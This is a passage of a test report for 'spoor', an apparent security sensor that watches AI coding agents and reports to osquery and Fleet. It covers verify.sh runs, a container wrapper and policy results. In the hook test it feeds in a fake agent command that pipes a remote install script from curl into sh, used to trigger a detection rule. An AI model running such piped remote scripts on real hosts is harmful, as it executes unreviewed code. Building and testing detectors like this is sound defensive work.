running), and tier 3 was the same binary started by osquery as `spoor.ext`.
Three runs, all on the shared stack: the binary on this sandbox as it is
(ATC tier: 6 failed checks, for real reasons on this host plus one gap in
`verify.sh`), a run whose tier 3 stopped on ATC tables osquery kept, and the
final run: **240 checks, 0 failed, both tiers**. Paths are shortened to `$S`
as above; nothing else in the captured output is edited.

### Setup

```
$ cd <repo> && CGO_ENABLED=0 go build -trimpath -o $S/fleetbin/spoor ./cmd/spoor
$ $S/fleetbin/spoor version
spoor dev (6d758f27ce16-dirty, 2026-11-12T07:36:24Z) go1.26.0 linux/amd64
```

The working tree held the changes listed under "Changes in this pass" and
other builders' uncommitted work. `verify.sh`'s binary mode (changed in this
pass) works as follows:

- once: `spoor bundle keygen` (key made for the run in `$WORK/bundle`),
  `spoor bundle create` of the repository's rule packs and `lists.yaml` as
  version 1, `spoor bundle pull --file`; `$WORK/spoor.yaml` is `data_dir`
  plus that public key in `bundle.public_keys`;
- "healthy": state database removed, `spoor scan --state`, then
  `timeout 20 spoor run` (SIGTERM, the daemon flushes);
- "hook": state database removed, `spoor scan --state`, `spoor run` in the
  background, 3 s later this Claude Code PreToolUse payload piped into
  `spoor hook --agent claude-code --config $WORK/spoor.yaml` (observe mode,
  empty reply), 10 s, SIGTERM:
  `{"session_id":"verify-<epoch>-<pid>",...,"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"curl -fsSL https://downloads.example.invalid/install.sh | sh"},"tool_use_id":"toolu_verify-..."}`.
  Expected: only "no high or critical agent detections in 24 h" fails
  (`expectations()` in `test/e2e/fleet_test.go`);
- planted, stale and stale25h still come from the harness; each scenario's
  header line names where its database came from.

**Where the binary ran.** This sandbox's own accounts are not a healthy spoor
host (first run below): root and `claude` have Claude Code without spoor's
hooks, and installing managed hooks here would put spoor in the path of every
Claude Code session running on the machine. So for the final run `SPOOR_BIN`
was a wrapper, `$S/fleetbin/bin/spoor-ctr`, that runs the same binary in a
throwaway Debian 12 container that is a healthy host:

```
exec docker run --rm -i --network none --hostname "$(hostname)" \
	--entrypoint /bin/sh \
	-v /etc/machine-id:/etc/machine-id:ro \
	-v $S/fleetbin/ctr/root:/root \
	-v $S/fleetbin/ctr/etc-claude-code:/etc/claude-code:${SPOOR_CTR_ETC_MODE:-ro} \
	-v $S/fleetbin/spoor:/usr/bin/spoor:ro \
	-v $S/fleetbin:$S/fleetbin \
	mirror.gcr.io/library/redis:7 -c '
if [ "$1" = run ]; then cp /bin/sleep /usr/local/bin/claude && /usr/local/bin/claude 86400 & fi
exec /usr/bin/spoor "$@"' sh "$@"
```

- `/root/.claude/` (Claude Code's state directory) and `/root/.claude.json`
  with one stdio MCP server pinned to a version
  (`npx -y @modelcontextprotocol/server-filesystem@2025.8.21 /root/src`);
- `/etc/claude-code/managed-settings.d/50-spoor.json`, written by the binary
  in that container: `SPOOR_CTR_ETC_MODE=rw spoor-ctr hooks install --scope
  managed --agents claude-code` printed `claude-code  managed  create
  /etc/claude-code/managed-settings.d/50-spoor.json`;
- for `spoor run` only, a running agent process: `/usr/local/bin/claude`, a
  copy of `sleep` (procmon matches the binary name);
- `$S/fleetbin` is mounted at the same path, so the database the binary
  writes in the container is the file osquery on this host reads (ATC path
  and `spoor.ext`); this host's `/etc/machine-id` and hostname are passed in,
  so `spoor_health.host_id` is this host's id (source `machine-id`);
- `docker run` forwards SIGTERM to spoor (pid 1 after `exec`): every daemon
  log ends with `spoor daemon stopped`.

**The extension.** `$S/fleetbin/spoor.ext` is a byte-identical copy of the
binary. osquery starts an extension with only `--socket`, `--timeout` and
`--interval`, so the binary finds its database through
`/etc/spoor/spoor.yaml` (`cmd/spoor/ext.go`). `/etc/spoor` did not exist; it
was created for the run with `data_dir: $S/fleetbin/run3/data` and deleted
afterwards. Running as root under osqueryd, the extension also wrote
`/etc/spoor/host_id` (osquery's `system_info.uuid`, which is the Fleet host
UUID `5e8102a2-...`) at 08:07, as `cmd/spoor/ext.go` intends; it went with
the directory.

Command of the final run (`fleetctl` and `restart-osqueryd` are copies of
the helpers section 1 names; `$WORK/bin/spoor`, the path the "spoor
installed" label looks for, was a copy of the binary):

```
FLEETCTL=$S/fleetbin/bin/fleetctl FLEET_HOST=vm WORK=$S/fleetbin/run3 PREFIX=spoor-c5- \
SPOOR_BIN=$S/fleetbin/bin/spoor-ctr \
EXT_LOAD=$S/fleetstack/osq/extensions.load EXT_BIN=$S/fleetbin/spoor.ext \
OSQUERY_RESTART=$S/fleetbin/bin/restart-osqueryd ./deploy/fleet/verify.sh
```

### First run: the binary on this sandbox as it is (ATC tier)

`verify.sh` as it was before this pass (healthy database from the binary,
configuration `data_dir` only, every other scenario from the harness), with
`SPOOR_BIN=$S/fleetbin/spoor` run directly on this host, no extension tier.
120 checks, **6 failed**: three policies of the healthy scenario, each as a
live query and as Fleet's result. Excerpt: the healthy scenario, then only
the header lines of the harness scenarios (their 96 checks were all ok) and
the cleanup.

```
[07:30:33] == scenario healthy (ATC)
  live query of every spoor table:
        spoor_agents                 2 rows; columns: asset_id,catalog_id,change,confidence,evidence,first_seen,hooks,host_display_name,host_hos
        spoor_mcp_servers            0 rows; columns: 
        spoor_extensions             1 rows; columns: asset_id,first_seen,host_display_name,host_hostname,kind,last_changed,last_seen,name,owner
        spoor_posture                5 rows; columns: actual,agent_id,asset_id,check_id,first_seen,host_display_name,host_hostname,last_seen,own
        spoor_detections             1 rows; columns: agent_id,category,confidence,count,dedup_key,enforced,event_id,host_display_name,host_host
        spoor_sessions               2 rows; columns: agent_id,coverage,detections,host_display_name,host_hostname,last_event,max_severity,path,
        spoor_agent_processes        1 rows; columns: agent_id,container_id,exe,first_seen,flags,host_display_name,host_hostname,last_seen,path,
        spoor_coverage               2 rows; columns: agent_id,hooks,host_display_name,host_hostname,path,processes,state,transcript,updated,use
        spoor_health                 1 rows; columns: bundle_version,catalog_version,detections,dropped,errors,events_in,events_out,heartbeat,ho
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  FAIL  spoor-c5-spoor - managed hooks effective for every AI agent            got fail, want pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  FAIL  spoor-c5-spoor - rules bundle is current                               got fail, want pass
  FAIL  spoor-c5-spoor - inventory scan complete and recent                    got fail, want pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  Fleet policy results after refetch:
  FAIL  spoor-c5-spoor - inventory scan complete and recent                    got fail, want pass
  FAIL  spoor-c5-spoor - managed hooks effective for every AI agent            got fail, want pass
  FAIL  spoor-c5-spoor - rules bundle is current                               got fail, want pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[07:32:36] == scenario planted (ATC)
[07:33:33] == scenario stale (ATC)
[07:34:30] == scenario stale25h (ATC)
[07:35:29] == scenario removed (ATC)
[07:37:26] cleanup
[07:37:26] agent options restored: identical to the saved copy
[07:37:27] objects named spoor-c5-* left on the server: labels 0, reports 0, policies []
[07:37:27] done: 6 failed checks
```

Why, from the state database the binary wrote:

- **managed hooks**: `spoor_agents` held Claude Code for `root` and for
  `claude` (evidence `state_dir`), `hooks` = `missing`: the build's own
  agents, which have no spoor hooks. Correct.
- **inventory scan**: the scan ledger said `denied (file not owned by the
  expected user): /home/claude/.claude/skills` and `removals not reported:
  the scan was not complete (1 denied)`; `scan_complete` 0, `last_scan`
  empty. Correct (fail-closed).
- **rules bundle**: `bundle_version` empty. The configuration `verify.sh`
  wrote named no trusted key and nothing installed a bundle, so its binary
  mode could not pass this policy on any host. A gap in `verify.sh`, fixed:
  it now signs and installs bundle version 1 as described above.

The daemon also tailed the transcripts of the Claude Code sessions running
on this machine: by the report step (07:36) its database held SPR-EVADE-002
(critical, "Sensor files deleted or modified") and SPR-EVADE-001 (high,
"Security tool stopped or killed") from one of those sessions; at the
healthy scenario (07:30) it held one detection below high and the detections
policy passed. On a working developer host the "healthy" database moves
under the test.

`verify.sh` exited 0 after `done: 6 failed checks`: its exit status does not
reflect failed checks (unchanged; read the last line).

Run 1's cleanup restored the agent options (identical) and removed every
object, but osqueryd kept the 9 spoor ATC tables registered: `osqueryd.log`
shows no removal after the restore (07:37:30), and they were still
registered at 07:52.

### Second run: tier 3 stopped on those ATC tables

The binary mode as changed in this pass, the container host without the MCP
server and agent process yet. ATC tier: 144 checks, 0 failed (healthy and
hook from the binary passed). Then:

```
[07:47:21] == tier 3: osquery extension $S/fleetbin/spoor.ext
  [+] applied fleet config
[07:52:48] FAILED: spoor tables registered: 9, want 0
[07:52:48] cleanup
[07:52:49] agent options restored: identical to the saved copy
[07:52:49] objects named spoor-c5-* left on the server: labels 0, reports 0, policies []
[07:52:49] done: 0 failed checks
```

`extensions.load` had not been touched. Restarting osqueryd with ENV.md's
command (07:53) cleared the tables. A probe right after (ATC applied, the
saved agent options applied again 5 s later) saw them go within 10 s; after
the final run's 9-minute ATC tier they stayed again (below). So osquery
5.19.0 does not reliably unregister ATC tables that the agent options stop
naming (section 1's run saw them go in 13 s); the cause inside osquery was
not looked into. `verify.sh` now restarts osqueryd in that case before
registering the extension, and its cleanup reports spoor tables still
registered. Run 2 also showed 0 rows in `spoor_mcp_servers`,
`spoor_detections`, `spoor_sessions` and `spoor_agent_processes` for the
healthy scenario: the container host got the pinned MCP server and the
running agent process, and the table listing also runs for "hook".

### Final run: both tiers

**240 checks, 0 failed**: 10 scenarios x 24 checks (10 policies as live
queries, 10 Fleet policy results after a refetch, 4 labels). From the
binary: healthy and hook, ATC and extension, 96 checks:

- **healthy**: every policy passes, live and in Fleet; "AI agents present"
  and "spoor installed" member, the two unhealthy labels not.
- **hook**: only "no high or critical agent detections in 24 h" fails, live
  and in Fleet; the other nine pass. The run's outbox holds the finding the
  daemon made from the hook's record: SPR-EXEC-001 "Remote script piped into
  an interpreter", severity high, agent `claude-code`, at 07:59:02 (ATC) and
  08:09:41 (extension).
- **removed**: every policy fails; "spoor sensor unhealthy" member, "AI
  agents present" not.
- **every spoor table** answered a Fleet live query with rows the binary
  wrote, in the hook scenario through ATC and through `spoor.ext` (a database
  removed just before and written only by `scan --state`, `run` and `hook`):
  agents 2, mcp_servers 1, extensions 15, posture 5, detections 1,
  sessions 1, agent_processes 1, coverage 1, health 1. In the healthy
  scenario detections and sessions are empty (no agent activity).
- `osquery_extensions` listed the binary: name `spoor`, version `dev`, type
  `extension`.
- the harness scenarios still pass: planted (both tiers), stale, stale25h.
- osquery again kept the ATC tables after the restore; `verify.sh` restarted
  osqueryd (08:07:06) and went on.

```
[07:56:32] Fleet 4.94.1, host vm (id 1), work dir $S/fleetbin/run3
[07:56:38] osquery 5.19.0
[07:56:38] saved agent options (920 bytes) to $S/fleetbin/run3/agent-options.before.json
[07:56:38] fleetctl gitops --dry-run deploy/fleet/gitops/default.yml
  [+] would've created 4 labels
  [+] would've applied certificate authorities
  [+] would've applied 4 scripts
  [+] would've applied fleet config
  [+] would've applied MDM profiles
  [+] would've applied enroll secrets
  [+] would've applied 10 policies
  [+] would've applied 4 reports
  [!] gitops dry run succeeded
[07:56:40] harness wrote specs, merged agent options and expectations for DB $S/fleetbin/run3/data/state.db
  [+] applied fleet config
  [+] applied 4 reports
  [+] applied 4 labels
  [+] applied 10 policies
[07:56:42] spoor binary: spoor dev (6d758f27ce16-dirty, 2026-11-12T07:36:24Z) go1.26.0 linux/amd64
  installed bundle version 1 (14 files) under $S/fleetbin/run3/data/bundle
[07:56:45] == tier 2: ATC
[07:56:51] all 9 spoor tables registered through ATC
[07:56:51] == scenario healthy (ATC), state database from the spoor binary
  live query of every spoor table:
        spoor_agents                 2 rows; columns: asset_id,catalog_id,change,confidence,evidence,first_seen,hooks,host_display_name,host_hos
        spoor_mcp_servers            1 rows; columns: asset_id,auth_mode,command,ecosystem,env_keys,first_seen,host_display_name,host_hostname,l
        spoor_extensions             15 rows; columns: asset_id,first_seen,host_display_name,host_hostname,kind,last_changed,last_seen,name,owner
        spoor_posture                5 rows; columns: actual,agent_id,asset_id,check_id,first_seen,host_display_name,host_hostname,last_seen,own
        spoor_detections             0 rows; columns: 
        spoor_sessions               0 rows; columns: 
        spoor_agent_processes        1 rows; columns: agent_id,container_id,exe,first_seen,flags,host_display_name,host_hostname,last_seen,path,
        spoor_coverage               1 rows; columns: agent_id,hooks,host_display_name,host_hostname,path,processes,state,transcript,updated,use
        spoor_health                 1 rows; columns: bundle_version,catalog_version,detections,dropped,errors,events_in,events_out,heartbeat,ho
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[07:58:58] == scenario hook (ATC), state database from the spoor binary
  live query of every spoor table:
        spoor_agents                 2 rows; columns: asset_id,catalog_id,change,confidence,evidence,first_seen,hooks,host_display_name,host_hos
        spoor_mcp_servers            1 rows; columns: asset_id,auth_mode,command,ecosystem,env_keys,first_seen,host_display_name,host_hostname,l
        spoor_extensions             15 rows; columns: asset_id,first_seen,host_display_name,host_hostname,kind,last_changed,last_seen,name,owner
        spoor_posture                5 rows; columns: actual,agent_id,asset_id,check_id,first_seen,host_display_name,host_hostname,last_seen,own
        spoor_detections             1 rows; columns: agent_id,category,confidence,count,dedup_key,enforced,event_id,host_display_name,host_host
        spoor_sessions               1 rows; columns: agent_id,coverage,detections,host_display_name,host_hostname,last_event,max_severity,path,
        spoor_agent_processes        1 rows; columns: agent_id,container_id,exe,first_seen,flags,host_display_name,host_hostname,last_seen,path,
        spoor_coverage               1 rows; columns: agent_id,hooks,host_display_name,host_hostname,path,processes,state,transcript,updated,use
        spoor_health                 1 rows; columns: bundle_version,catalog_version,detections,dropped,errors,events_in,events_out,heartbeat,ho
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[08:00:57] == scenario planted (ATC), state database from the harness
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[08:01:56] == scenario stale (ATC), state database from the harness
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        member
  ok    spoor-c5-spoor tables unavailable                                      not member
[08:02:52] == scenario stale25h (ATC), state database from the harness
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        member
  ok    spoor-c5-spoor tables unavailable                                      not member
[08:03:51] == scenario removed (ATC), state database from nowhere, removed
  state database removed: ls: cannot access '$S/fleetbin/run3/data/state.db': No such file or directory
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    fail
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 fail
  ok    spoor-c5-spoor - no AI agent running unobserved                        fail
  ok    spoor-c5-spoor - no auto-run file planted in a project                 fail
  ok    spoor-c5-spoor - no high or critical agent configuration failure       fail
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               fail
  ok    spoor-c5-spoor - rules bundle is current                               fail
  ok    spoor-c5-spoor - sensor is reporting                                   fail
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             not member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        member
  ok    spoor-c5-spoor tables unavailable                                      not member
[08:04:47] == reports (stock profile and opt-in exec reports) as live queries on the healthy database
        spoor - detections                                             [darwin,linux,windows] 0 rows
        spoor - AI inventory (packed)                                  [darwin,linux,windows] 1 rows
        spoor - telemetry coverage                                     [darwin,linux,windows] 1 rows
        spoor - sensor health                                          [darwin,linux,windows] 1 rows
        spoor opt-in - agent child processes (Linux, audit)            [linux] 0 rows
        spoor opt-in - agent child processes (macOS, EndpointSecurity) [darwin] error: no such table: es_process_events
        spoor opt-in - agent child processes (Windows, ETW)            [windows] error: no such table: process_etw_events
[08:05:44] == tier 3: osquery extension $S/fleetbin/spoor.ext
  [+] applied fleet config
[08:07:06] 9 ATC tables still registered after the agent options were restored; restarting osqueryd
[08:07:16] ATC tables gone; registering the extension in $S/fleetstack/osq/extensions.load
  [{"host_display_name":"vm","host_hostname":"vm","name":"spoor","path":"/run/osqt/osquery.em.52434","type":"extension","version":"dev"}]
[08:07:31] == scenario healthy (extension), state database from the spoor binary
  live query of every spoor table:
        spoor_agents                 2 rows; columns: asset_id,catalog_id,change,confidence,evidence,first_seen,hooks,host_display_name,host_hos
        spoor_mcp_servers            1 rows; columns: asset_id,auth_mode,command,ecosystem,env_keys,first_seen,host_display_name,host_hostname,l
        spoor_extensions             15 rows; columns: asset_id,first_seen,host_display_name,host_hostname,kind,last_changed,last_seen,name,owner
        spoor_posture                5 rows; columns: actual,agent_id,asset_id,check_id,first_seen,host_display_name,host_hostname,last_seen,own
        spoor_detections             0 rows; columns: 
        spoor_sessions               0 rows; columns: 
        spoor_agent_processes        1 rows; columns: agent_id,container_id,exe,first_seen,flags,host_display_name,host_hostname,last_seen,pid,r
        spoor_coverage               1 rows; columns: agent_id,hooks,host_display_name,host_hostname,processes,state,transcript,updated,user
        spoor_health                 1 rows; columns: bundle_version,catalog_version,detections,dropped,errors,events_in,events_out,heartbeat,ho
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[08:09:37] == scenario hook (extension), state database from the spoor binary
  live query of every spoor table:
        spoor_agents                 2 rows; columns: asset_id,catalog_id,change,confidence,evidence,first_seen,hooks,host_display_name,host_hos
        spoor_mcp_servers            1 rows; columns: asset_id,auth_mode,command,ecosystem,env_keys,first_seen,host_display_name,host_hostname,l
        spoor_extensions             15 rows; columns: asset_id,first_seen,host_display_name,host_hostname,kind,last_changed,last_seen,name,owner
        spoor_posture                5 rows; columns: actual,agent_id,asset_id,check_id,first_seen,host_display_name,host_hostname,last_seen,own
        spoor_detections             1 rows; columns: agent_id,category,confidence,count,dedup_key,enforced,event_id,host_display_name,host_host
        spoor_sessions               1 rows; columns: agent_id,coverage,detections,host_display_name,host_hostname,last_event,max_severity,permi
        spoor_agent_processes        1 rows; columns: agent_id,container_id,exe,first_seen,flags,host_display_name,host_hostname,last_seen,pid,r
        spoor_coverage               1 rows; columns: agent_id,hooks,host_display_name,host_hostname,processes,state,transcript,updated,user
        spoor_health                 1 rows; columns: bundle_version,catalog_version,detections,dropped,errors,events_in,events_out,heartbeat,ho
  policies evaluated as live queries (a row = pass):
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  Fleet policy results after refetch:
  ok    spoor-c5-spoor - no high or critical agent detections in 24 h          fail
  ok    spoor-c5-spoor - inventory scan complete and recent                    pass
  ok    spoor-c5-spoor - managed hooks effective for every AI agent            pass
  ok    spoor-c5-spoor - no AI agent in permission-bypass mode                 pass
  ok    spoor-c5-spoor - no AI agent running unobserved                        pass
  ok    spoor-c5-spoor - no auto-run file planted in a project                 pass
  ok    spoor-c5-spoor - no high or critical agent configuration failure       pass
  ok    spoor-c5-spoor - no unpinned or inline-secret MCP server               pass
  ok    spoor-c5-spoor - rules bundle is current                               pass
  ok    spoor-c5-spoor - sensor is reporting                                   pass
  label membership after refetch:
  ok    spoor-c5-AI agents present                                             member
  ok    spoor-c5-spoor installed                                               member
  ok    spoor-c5-spoor sensor unhealthy                                        not member
  ok    spoor-c5-spoor tables unavailable                                      not member
[08:11:36] == scenario planted (extension), state database from the harness
